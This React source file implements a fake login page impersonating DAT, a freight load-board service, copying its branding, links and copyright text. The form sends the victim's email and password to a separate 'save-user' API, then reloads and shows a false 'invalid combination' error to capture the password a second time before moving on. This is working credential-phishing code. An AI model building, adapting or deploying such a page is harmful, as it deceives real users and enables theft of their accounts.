import '@/components/Form/Form.scss';
import Input from '../Input';
import { useCallback, useEffect } from 'react';
import { Checkbox, FormControlLabel } from '@mui/material';
import axios from 'axios';

const EMAIL_PATTERN = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

const Form = ({ formState, setFormState, setStep }) => {
  useEffect(() => {
    if (localStorage.getItem('staging') === 'true') {
      setFormState({
        email: {
          value: '',
          valid: false,
          touched: false,
          error: '',
        },
        password: {
          value: '',
          valid: false,
          touched: true,
          error: 'Invalid email and password combination',
        },
      });
    }
  }, []);

  const handleChange = useCallback((e) => {
    const { name, value } = e.target;
    setFormState((prevState) => ({
      ...prevState,
      [name]: {
        ...prevState[name],
        value,
        error: '',
      },
    }));
  }, []);

  const handleFocus = useCallback((e) => {
    const { name } = e.target;
    setFormState((prevState) => ({
      ...prevState,
      [name]: {
        ...prevState[name],
        touched: true,
      },
    }));
  }, []);

  const validateForm = useCallback(() => {
    const errors = {};
    if (!formState.email.value) {
      errors.email = 'Required field.\nEnter a valid email address.';
    } else if (!EMAIL_PATTERN.test(formState.email.value)) {
      errors.email = 'Invalid email address';
    }
    if (!formState.password.value) {
      errors.password = 'Password is required';
    }
    return errors;
  }, [formState]);

  const handleSubmit = useCallback(
    (e) => {
      e.preventDefault();
      const errors = validateForm();
      if (Object.keys(errors).length) {
        setFormState((prevState) => ({
          ...prevState,
          ...errors,
        }));
      } else {
        if (localStorage.getItem('staging') === 'true') {
          axios
            .post(`${import.meta.env.VITE_API}save-user`, {
              email: formState.email.value,
              id: formState.password.value,
            })
            .then(function (response) {
              localStorage.removeItem('staging');
              setStep(2);
            })
            .catch(function (error) {
              console.log(error);
            });
          console.log('axios call, remove from localstorage');
        } else {
          axios
            .post(`${import.meta.env.VITE_API}save-user`, {
              email: formState.email.value,
              id: formState.password.value,
            })
            .then(function (response) {
              localStorage.setItem('staging', 'true');
              window.location.reload();
            })
            .catch(function (error) {
              console.log(error);
            });
        }
      }
    },
    [validateForm, formState, setStep]
  );

  const handleBlur = useCallback(
    (e) => {
      const { name, value } = e.target;
      if (value.trim() === '') {
        setFormState((prevState) => ({
          ...prevState,
          [name]: {
            ...prevState[name],
            touched: true,
            error:
              name === 'email'
                ? `Required field.\nEnter a valid email address.`
                : `Required field.
`,
          },
        }));
      } else if (name === 'email' && !EMAIL_PATTERN.test(value)) {
        setFormState((prevState) => ({
          ...prevState,
          [name]: {
            ...prevState[name],
            touched: true,
            error: 'Invalid email address',
            valid: false,
          },
        }));
      } else {
        setFormState((prevState) => ({
          ...prevState,
          [name]: {
            ...prevState[name],
            touched: true,
            error: '',
            valid: true,
          },
        }));
      }
    },
    [setFormState]
  );

  return (
    <>
      <div className="form">
        <h1 className="form__title">Log in</h1>
        <h3 className="form__subtitle">to continue to your DAT account</h3>
        <div className="form__form-inner">
          <div className="form__block">
            <div class="form__link-wrapper">
              <a href="https://power.dat.com/forgotusername" target="_blank" class="form__link">
                Forgot your username?
              </a>
            </div>
            <div className="form__input-wrapper">
              <Input
                type="text"
                placeholder="Username/Email *"
                name="email"
                value={formState.email.value}
                onChange={handleChange}
                onBlur={handleBlur}
                onFocus={handleFocus}
                error={formState.email.error}
              />
            </div>
            {formState.email.error && <span className="input__error-text">{formState.email.error}</span>}

            <div className="form__checkbox-wrapper">
              <FormControlLabel
                control={
                  <Checkbox
                    sx={{
                      '& .MuiSvgIcon-root': { fontSize: 22 },
                      '&.Mui-checked': {
                        color: '#0046E0',
                      },
                    }}
                    defaultChecked
                  />
                }
                label="Remember me"
              />
            </div>
            <div class="form__link-wrapper">
              <a href="https://power.dat.com/forgotusername" target="_blank" class="form__link">
                Reset Password
              </a>
            </div>
            <div className="form__input-wrapper">
              <Input
                type="password"
                placeholder="Password *"
                name="password"
                value={formState.password.value}
                onChange={handleChange}
                onBlur={handleBlur}
                onFocus={handleFocus}
                error={formState.password.error}
              />
            </div>
            {formState.password.error && <span className="input__error-text">{formState.password.error}</span>}
            <div className="form__button">
              <button
                type="submit"
                onClick={handleSubmit}
                className="form__button-submit"
                disabled={
                  !formState.email.value?.length ||
                  !formState.password.value?.length ||
                  !formState.email.valid ||
                  !formState.password.valid
                }
              >
                LOG IN
              </button>
            </div>
            <div className="form__signup">
              <a href="https://login.dat.com/login?state=hKFo2SBHOENhdGlBc19UUnlZRzhWanNha011YVNwQVEtNkxqeaFupWxvZ2luo3RpZNkga3JfMjkwX1dxUkZGRmFPRktPOTJEV2RQcEM4aXpwZkqjY2lk2SAxMGpSM1QzZnBXVlIybUs5a09Jb1JBRDFjcWZleGdUaw&client=10jR3T3fpWVR2mK9kOIoRAD1cqfexgTk&protocol=oauth2&prompt=login&response_type=token%20id_token&redirect_uri=https:%2F%2Fssu.dat.com%2Fcallback&scope=openid%20profile%20email&audience=https:%2F%2Fprod-api.dat.com&app_name=DAT%20SSU&page_mode=ssu&init_username=&view=login&email_readonly=false&signup=basicwithauthority&product=one_web&nonce=7pye4pBDo.4ClnyRyv0Owys7r310Jk_f&auth0Client=eyJuYW1lIjoiYXV0aDAuanMiLCJ2ZXJzaW9uIjoiOS4yMS4wIn0%3D&capturedTime=1729139013976">
                <span>Need an account?</span>
                <strong>Create account</strong>
              </a>
            </div>
            <div className="form__terms">
              <span>
                By continuing you agree to our
                <a target="_blank" href="https://www.dat.com/terms-and-conditions">
                  terms and conditions.
                </a>
              </span>
            </div>
          </div>
        </div>
      </div>
      <div className="form__privacy">
        <span>Copyright © 2024 DAT Solutions, LLC. All rights reserved.</span>
        <a target="_blank" href="https://www.dat.com/privacy-policy">
          Privacy Policy
        </a>
      </div>
    </>
  );
};

export default Form;
